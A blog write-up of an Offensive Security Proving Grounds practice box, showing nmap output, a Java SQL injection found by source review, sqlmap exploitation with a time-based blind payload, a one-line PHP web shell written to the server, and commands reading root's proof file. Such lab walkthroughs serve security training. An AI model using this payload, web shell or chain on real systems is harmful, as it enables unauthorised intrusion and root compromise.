---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a simple `nmap` scan to identify the attack surface of the target.

## nmap
```bash
sudo nmap -Pn -p22,17445,30455,50080 -sV 192.168.152.147
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 14:55 EST
Nmap scan report for 192.168.152.147
Host is up (0.10s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
17445/tcp open  unknown
30455/tcp open  http    nginx 1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port17445-TCP:V=7.92%I=7%D=1/30%Time=61F6ED36%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,623,"HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no-cac
SF:he,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-cach
SF:e\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text
SF:/html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sun,\x203
SF:0\x20Jan\x202022\x2019:55:34\x20GMT\r\nConnection:\x20close\r\n\r\n\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\t<head>\n\x20\x20\x20\x20\t<m
SF:eta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20\t<title>Issue\x20Tracker</t
SF:itle>\n\t\t<link\x20href=\"/css/bootstrap\.min\.css\"\x20rel=\"styleshe
SF:et\"\x20/>\n\t</head>\n\t<body>\n\t\x20\x20\x20\x20<section>\n\t\t<div\
SF:x20class=\"container\x20mt-4\">\n\t\t\t<span>\n\x20\t\t\t\n\t\x20\x20\x
SF:20\x20\x20\x20\x20\x20<div>\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20
SF:href=\"/login\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right\
SF:">Sign\x20In</a>\x20\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20href=\"
SF:/register\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right;marg
SF:in-right:5px\">Register</a>\n\t\x20\x20\x20\x20\x20\x20\x20\x20</div>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20</span>\n\t\t\t<br><br>\n\t\t\t<table\x
SF:20class=\"table\">\n\t\t\t<thead>\n\t\t\t\t<tr>\n\t\t\t\t\t<th>ID</th>\
SF:n\t\t\t\t\t<th>Message</th>\n\t\t\t\t\t<th>P")%r(HTTPOptions,12B,"HTTP/
SF:1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:
SF:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\
SF:x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Len
SF:gth:\x200\r\nDate:\x20Sun,\x2030\x20Jan\x202022\x2019:55:34\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r
SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r
SF:\nContent-Length:\x20435\r\nDate:\x20Sun,\x2030\x20Jan\x202022\x2019:55
SF::34\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1></body></html>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.18 seconds
```

## dir busting
> There are three different web servers on the target.  
>  
> Dir busting the services with tools like `dirb` or `gobuster` exposes the following relevant resources.  
> - on port 30455: `/phpinfo.php`
> - on port 50080: `/cloud` (`mycloud` instance)
{: .prompt-info }

---

# exploitation
## testing web server on port 17445
The application is a issue tracker with a lot of input sinks.  

> Unfortunately it does not react to our black box testing.
{: .prompt-danger }

## testing cloud resource on port 50080

> Weak credentials `admin:admin` are working!
{: .prompt-info }

> Looking around in the content of the `admin` account shows that we can download the source code of the issue tracker which is served on port 17445. Download it!
{: .prompt-info }

## issuetracker source code review
### interesting file: 
`issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java`

> Investigating the source code reveals that there is an `SQL` injection which we can exploit.
{: .prompt-info }

### code line with SQLi vulnerability
```java
...
@GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);

        } catch (SQLException e1) {
                        // TODO Auto-generated catch block
                        e1.printStackTrace();

...
```

The final `SQL` query is built with the variable `priority` which is integrated as user input without any sanitization.  
This `POST` request seem to be 'hidden' in the context of black box testing, as we were not able identify it by going through the application earlier.  

> This emphasizes the importance of code review and how it usally is more reliable then a simple black box test.
{: .prompt-info }

### vulnerable post request
```http
POST /issue/checkByPriority HTTP/1.1
Host: 192.168.152.147:17445
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.152.147:17445
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.152.147:17445/issue/add
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=8CAA9ED39629A5020FE02BE209A32DED
Connection: close

priority=123
```

### exploit it with sqlmap

1. In `burpsuite`
    - craft post request
    - right click inside request
    - `Save item`
    - save it to disk.
2. Load the saved request into `sqlmap`

```bash
$ sqlmap --random-agent -r hawat.request                                          
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.5.11#stable}                                                                                                                                                                                                   
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:35:19 /2022-01-30/

[15:35:19] [INFO] parsing HTTP request from 'hawat.request'
[15:35:19] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:35:19] [INFO] resuming back-end DBMS 'mysql' 
[15:35:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: priority (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: priority=Unbreak' AND (SELECT 3403 FROM (SELECT(SLEEP(5)))bMOR) AND 'ByEz'='ByEz
---

```

> `SQLMap` identified the `SQLi`
{: .prompt-info }

---

# post exploitation

Our goal here will be to write a `web shell` to the target.  
Before we can write the shell, we need to check where the `www` root folder of the targt server is located. 

## determine web folder
The `phphinfo.php` file we detected earlier on `http://192.168.152.147:30455` leaks a web folder location.  

> `$_SERVER['DOCUMENT_ROOT']	/srv/http`
{: .prompt-info }

## verify location by reading the `phpinfo.php` file
```bash
$ sqlmap --random-agent -r hawat.request --file-read=/srv/http/phpinfo.php 
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.5.11#stable}                                                                                                                                                                                                   
|_ -| . [']     | .'| . |                                                                                                                                                                                                                   
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:30:21 /2022-01-30/

[15:30:21] [INFO] parsing HTTP request from 'hawat.request'
[15:30:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.0.16) Gecko/2009121601 Ubuntu/9.04 (jaunty) Firefox/3.0.16' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:30:21] [INFO] resuming back-end DBMS 'mysql' 
[15:30:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: priority (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: priority=Unbreak' AND (SELECT 3403 FROM (SELECT(SLEEP(5)))bMOR) AND 'ByEz'='ByEz
---
[15:30:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:30:21] [INFO] fingerprinting the back-end DBMS operating system
[15:30:26] [INFO] the back-end DBMS operating system is Linux
[15:30:26] [INFO] fetching file: '/srv/http/phpinfo.php'
[15:30:26] [INFO] retrieved: 
[15:30:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
3
[15:30:44] [INFO] adjusting time delay to 1 second due to good response times
C3F7068700A706870696E666F28293B0A
do you want confirmation that the remote file '/srv/http/phpinfo.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] 
[15:32:29] [INFO] retrieved: 17
[15:32:34] [INFO] the local file '/home/void/.local/share/sqlmap/output/192.168.152.147/files/_srv_http_phpinfo.php' and the remote file '/srv/http/phpinfo.php' have the same size (17 B)
files saved to [1]:
[*] /home/void/.local/share/sqlmap/output/192.168.152.147/files/_srv_http_phpinfo.php (same file)

[15:32:34] [INFO] fetched data logged to text files under '/home/void/.local/share/sqlmap/output/192.168.152.147'

[*] ending @ 15:32:34 /2022-01-30/
```
> Looks good!
{: .prompt-info }

## write web shell

`shell.php`
```php
<?php system($_REQUEST['cmd']); ?>
```

`SQLMap` command
```bash
$ sqlmap --random-agent -r hawat.request --file-write=/home/void/Documents/offsec/shell.php --file-dest=/srv/http/shell.php                                                                                                           1 ⨯
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.5.11#stable}                                                                                                                                                                                                   
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:35:19 /2022-01-30/

[15:35:19] [INFO] parsing HTTP request from 'hawat.request'
[15:35:19] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:35:19] [INFO] resuming back-end DBMS 'mysql' 
[15:35:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: priority (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: priority=Unbreak' AND (SELECT 3403 FROM (SELECT(SLEEP(5)))bMOR) AND 'ByEz'='ByEz
---
[15:35:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:35:19] [INFO] fingerprinting the back-end DBMS operating system
[15:35:20] [INFO] the back-end DBMS operating system is Linux
[15:35:20] [WARNING] expect junk characters inside the file as a leftover from original query
do you want confirmation that the local file '/home/void/Documents/offsec/shell.php' has been successfully written on the back-end DBMS file system ('/srv/http/shell.php')? [Y/n] 
[15:35:22] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[15:35:34] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[15:35:45] [INFO] adjusting time delay to 1 second due to good response times
91
[15:35:47] [INFO] the remote file '/srv/http/shell.php' is larger (91 B) than the local file '/home/void/Documents/offsec/shell.php' (35B)
[15:35:47] [INFO] fetched data logged to text files under '/home/void/.local/share/sqlmap/output/192.168.152.147'

[*] ending @ 15:35:47 /2022-01-30/
```

## verify that the `web shell` was written
### request
```bash
GET /shell.php?cmd=whoami HTTP/1.1
Host: 192.168.152.147:30455
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=8CAA9ED39629A5020FE02BE209A32DED
Connection: close
```
### response
```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 30 Jan 2022 20:36:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.15
Content-Length: 61

root
```

> And we got a `root` shell!
{: .prompt-info }

---

# get the flag
## request
```http
GET /shell.php?cmd=cat+/root/proof.txt HTTP/1.1
Host: 192.168.152.147:30455
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=8CAA9ED39629A5020FE02BE209A32DED
Connection: close
```

## response
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 30 Jan 2022 20:37:20 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.15
Content-Length: 89

0******************************2
```

Pwned! <@:-)
